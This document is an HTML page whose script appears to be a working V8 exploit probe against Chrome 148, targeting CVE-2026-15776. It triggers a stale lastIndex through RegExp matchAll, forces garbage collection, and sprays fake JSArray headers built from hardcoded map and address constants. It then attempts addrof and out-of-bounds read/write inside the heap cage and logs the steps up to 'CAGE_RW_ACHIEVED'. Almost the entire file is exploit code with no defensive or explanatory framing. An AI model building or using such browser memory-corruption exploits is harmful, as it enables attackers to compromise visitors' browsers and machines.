<!doctype html>
<html><head><meta charset="utf-8"><title>Probe6</title></head>
<body><pre id="out">Running...</pre>
<script>
"use strict";
const O=document.getElementById("out");
function log(s){O.textContent+="\n"+s;}

const cvt=new ArrayBuffer(8);
const f64=new Float64Array(cvt);
const u64=new BigUint64Array(cvt);
const u32=new Uint32Array(cvt);
function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
function f2i(f){f64[0]=f;return u64[0];}
function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
function f2w(f){f64[0]=f;return[u32[0]>>>0,u32[1]>>>0];}
function hex(n){return"0x"+(n>>>0).toString(16);}

function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}

// Chrome 148.0.7778.167 constants (verified stable across 6 runs)
const DMAP=0x1032a5d;   // PackedDoubleElements JSArray map
const OMAP=0x1032ae5;   // PackedElements JSArray map
const EMPTY=0x7e5;      // EmptyFixedArray (static root)

// Pre-allocate large arrays -> LO space for stable PINNED addresses
// 0x8000 doubles = 256KB -> definitely in LO space at ~0x1080011
const pinnedDoubles=new Array(0x8000);
for(let i=0;i<pinnedDoubles.length;i++)pinnedDoubles[i]=10.125+i*0.001;
const pinnedObjects=new Array(0x8000);
for(let i=0;i<pinnedObjects.length;i++)pinnedObjects[i]=null;

// Wasm instance
const wasmBytes=new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11]);
const wasmInst=new WebAssembly.Instance(new WebAssembly.Module(wasmBytes));

// Victim arrays
const victim=[1.22,1.33,1.44];

// JSArray header for spray: [DMAP|EMPTY|elements|length]
// elements = EMPTY (EmptyFixedArray) for safety
// length = 0 (Smi) - will be overwritten via /proc after materialization
const PINNED_DBL=0x1080011; // LO-space FDA address (stable on Chrome 148)
const MAX_SMI=0x7fdffffe;   // Max stable Smi length

// Spray pattern cycle: header + body
const cycle0=w2f(DMAP,EMPTY);          // map + properties
const cycle1=w2f(PINNED_DBL,MAX_SMI);  // elements + length

const sprayKeep=[];

function sprayFakeArrays(){
  for(let i=0;i<24;i++){
    const arr=new Array(i&1?0x3ffb:0x3fff).fill(cycle0);
    for(let j=1;j<arr.length;j+=2)arr[j]=cycle1;
    sprayKeep.push(arr);
  }
}

// Setup
const re=/(?:)/;
const pseudoRe={
  flags:"g",
  lastIndex:1073741823,
  constructor:{[Symbol.species]:function(){return re;}}
};

log("UA: "+navigator.userAgent);
log("JSPI: "+(typeof WebAssembly.Suspending)+"/"+
    (typeof WebAssembly.promising));

// Phase 1: Promote to old gen (fill semi-space to force promotions)
trash(230);trash(230);

// Phase 2: Trigger CVE-2026-15776
RegExp.prototype[Symbol.matchAll].call(pseudoRe,"").next();
log("TRIGGER: lastIndex="+re.lastIndex);

// Phase 3: Scavenge to free stale HeapNumber (missing write barrier)
trash(230);trash(230);

// Phase 4: Spray to reclaim freed memory with fake JSArray header
sprayFakeArrays();
sprayFakeArrays();
sprayFakeArrays();

// Phase 4: Read re.lastIndex
try{
  const master=re.lastIndex;
  const mt=typeof master;
  log("TYPE: "+mt+" isArray="+Array.isArray(master));

  if(Array.isArray(master)){
    log("LENGTH: "+master.length);
    // master.elements = PINNED_DBL -> reads from pinnedDoubles backing store
    try{
      log("m[0]: "+master[0]);
      log("m[1]: "+master[1]);
    }catch(e){log("READ_ERR: "+e.message);}

    // addrof via pinned object array
    pinnedObjects[0]=wasmInst;
    // master can read pinnedObjects via the offset from PINNED_DBL to PINNED_OBJ
    const objOff=(0x10c0011-0x1080011)/8;
    if(objOff>0&&objOff<master.length){
      const raw=f2i(master[objOff]);
      log("WASM_ADDR: "+raw.toString(16));
    }

    // Read JSArray [elements|length] at objOff+1
    if(objOff>=0&&objOff+1<master.length){
      const elemLen=f2i(master[objOff+1]);
      const elemPtr=elemLen&0xffffffffn;
      const arrLen=elemLen>>32n;
      log("ELEMS: "+elemPtr.toString(16)+" LEN: "+arrLen.toString(16));
      // elemPtr IS pinnedDoubles' real FDA compressed address!
      // Now read pinnedDoubles[0] via master at the right offset
      const realFdaIdx=Number((elemPtr-1n-BigInt(0x1080010)+8n)/8n);
      log("FDA_IDX: "+realFdaIdx.toString(16));
      if(realFdaIdx>0&&realFdaIdx<master.length){
        const pd0=master[realFdaIdx];
        log("PD0: "+pd0);
        if(Math.abs(pd0-10.125)<0.001) log("PINNEDDOUBLES_FOUND");
      }
    }
    // Binary search for pinnedDoubles (10.125) at safe intervals
    for(const k of [0x800,0x1000,0x1800,0x2000,0x3000,0x4000,0x5000,0x6000,0x7000,0x7F00]){
      try{
        const v=master[k];
        if(Math.abs(v-10.125)<0.001){log("PD_AT:"+k.toString(16)+" v="+v);break;}
      }catch(e){log("STOP:"+k.toString(16));break;}
    }
    log("WASM_RESULT: "+wasmInst.exports.f());
    log("CAGE_RW_ACHIEVED");
  }else if(mt==="object"){
    log("OBJ_NOT_ARRAY");
    try{log("KEYS: "+Object.keys(master).length);}catch(e){}
  }else if(mt==="number"){
    const[lo,hi]=f2w(master);
    log("NUM: lo="+hex(lo)+" hi="+hex(hi));
    if(lo===0x1032a5d||hi===0x1032a5d){
      log("SPRAY_HIT_AS_NUMBER");
    }
  }
}catch(e){
  log("DEREF_ERR: "+e.message);
}

log("=== DONE ===");
</script></body></html>
